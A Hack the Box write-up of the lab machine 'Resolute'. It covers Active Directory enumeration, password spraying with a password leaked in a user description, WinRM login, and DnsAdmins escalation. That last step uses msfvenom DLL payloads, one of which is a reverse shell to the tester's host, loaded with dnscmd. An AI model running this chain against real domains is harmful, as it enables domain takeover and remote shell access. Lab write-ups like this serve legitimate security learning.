+++
title = "Hack the Box: Resolute"
date = 2023-01-29
description = "Hack the Box: Resolute"
tags = [
    "Hack the Box",
    "Write-up"
]
+++

# Resolute

## Enumeration

### Nmap

```
# nmap -Pn --min-rate=10000 -sV -sC resolute.htb -nvv -e tun0 -p- -A -T4

PORT      STATE    SERVICE         REASON      VERSION
2/tcp     filtered compressnet     no-response
53/tcp    open     domain?         syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open     kerberos-sec    syn-ack     Microsoft Windows Kerberos (server time: 2020-05-07 08:32:52Z)
135/tcp   open     msrpc           syn-ack     Microsoft Windows RPC
139/tcp   open     netbios-ssn     syn-ack     Microsoft Windows netbios-ssn
389/tcp   open     ldap            syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds    syn-ack     Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open     kpasswd5?       syn-ack
593/tcp   open     ncacn_http      syn-ack     Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped      syn-ack
1082/tcp  filtered amt-esd-prot    no-response
2966/tcp  filtered idp-infotrieve  no-response
3268/tcp  open     ldap            syn-ack     Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped      syn-ack
5145/tcp  filtered rmonitor_secure no-response
5985/tcp  open     http            syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf          syn-ack     .NET Message Framing
12098/tcp filtered unknown         no-response
22723/tcp filtered unknown         no-response
47001/tcp open     http            syn-ack     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49665/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49666/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49667/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49671/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49676/tcp open     ncacn_http      syn-ack     Microsoft Windows RPC over HTTP 1.0
49677/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49688/tcp open     msrpc           syn-ack     Microsoft Windows RPC
49709/tcp open     msrpc           syn-ack     Microsoft Windows RPC
53759/tcp open     unknown         syn-ack
61911/tcp filtered unknown         no-response
64832/tcp filtered unknown         no-response
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/7%Time=5EB3C544%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h30m30s, deviation: 4h02m31s, median: 10m28s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13101/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 52471/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55070/udp): CLEAN (Timeout)
|   Check 4 (port 45712/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-07T01:33:44-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-07T08:33:42
|_  start_date: 2020-05-07T06:58:19
```

Judging by the services that are running on this system, it looks like an Active Directory domain controller. Since we don’t have any meaningful access, let’s see if we can find anything interesting from the SMB service. Port 139 and 445 are open, we can try to attack them.

`msf5 > auxiliary/scanner/smb/smb_ms17_010` `msf5 > auxiliary/scanner/smb/smb_version`

- `smbclient -L \\\\@ip\\`
- `smbclient -L \\\\@ip\\<share>$`

From enum4Linux we get a list of users and a password who was into a description:

```
# enum4linux resolute.htb
Domain Name: MEGABANK
Domain Sid: S-1-5-21-1392959593-3013219662-3596683436
```

MEGABANK\Administrator MEGABANK\DefaultAccount MEGABANK\krbtgt MEGABANK\MS02

KaTeX parse error: Undefined control sequence: \RESOLUTE at position 10: MEGABANK\̲R̲E̲S̲O̲L̲U̲T̲E̲

MEGABANK\ryan MEGABANK\marko - Desc: Account created. Password set to Welcome123! MEGABANK\sunita MEGABANK\abigail MEGABANK\marcus MEGABANK\sally MEGABANK\fred MEGABANK\angela MEGABANK\felicia MEGABANK\gustavo MEGABANK\ulf MEGABANK\stevie MEGABANK\claire MEGABANK\paulo MEGABANK\steve MEGABANK\annette MEGABANK\annika MEGABANK\per MEGABANK\claude MEGABANK\melanie MEGABANK\zach MEGABANK\simon MEGABANK\naoki MEGABANK\Guest

```
# sudo ldapdomaindump 10.10.10.169 -u MEGABANK\\melanie -p Welcome123!
```

![f405ab99ddb5a838ea5603bbb169e2c7.png](file:///C:/Users/Robin/.config/joplin-desktop/resources/ab0234a7ea8d4c75bac4935c9033068e.png)

## Foothold

We bruteforce the smb login with the password and the list of users:

```
# msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE ~/Downloads/users.txt
[+] 10.10.10.169:445      - 10.10.10.169:445 - Success: 'MEGABANK\melanie:Welcome123!'
```

We can connect using melanie credentials through evil-winrm because the port 5985 is open:

```
# sudo evil-winrm -i resolute.htb -u melanie -p Welcome123!
# cat user.txt
0c3be45fcfe249796ccbee8d3a978540
```

`Get-ADPrincipalGroupMembership melanie | select name` to get the groups where melanie is in.

## Privilege Escalation

Those doesn’t give anything interesting:

```
# upload winPEAS.exe
# powershell "C:\.....\winPEAS.exe cmd fast"
# watson
# powersploit powerup
```

Reaveal hidden directories and files:

```
# get-childitem -force in C:\
```

And we find a new account, part of DNSDomain group:

```
# get-childitem -force
# C:\PSTranscripts\20191203\PowerShell transcript file
# ryan Serv3r4Admin4cc123!
```

We can open a new winrm session with this account:

```
# sudo evil-winrm -i resolute.htb -u ryan -p Serv3r4Admin4cc123\!
```

`[Environment]::Is64BitOperatingSystem` in order to know the system’s arch.

We can now prepare the payloads, choose one :

```
# msfvenom -p windows/x64/exec cmd='net group "domain admins" melanie /add /domain' --platform windows -f dll > ./dns.dll
or
# msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.15.77 LPORT=1234 -f dll > rs.dll
```

Then open a SMB share from impacket:

```
# sudo impacket-smbserver -smb2support TMP /tmp
or
# sudo impacket-smbserver -smb2support -debug SHARE /tmp
```

from ryan’s evil winrm sessions:

```
# C:\Windows\System32\dnscmd.exe /config /serverlevelplugindll \\10.10.15.77\tmp\dns.dll
or
# C:\Windows\System32\dnscmd.exe /config /serverlevelplugindll \\10.10.15.77\tmp\rs.dll
```

And then restart the service with:

```
# sc.exe query dns
# sc.exe stop dns
# sc.exe start dns
```

You can now connect into a new evil-winrm session using melanie’s credentials. If you have choosed the second payload you don’t need to, you must start a listener with `nc -lvnp 1234` and wait a shell.
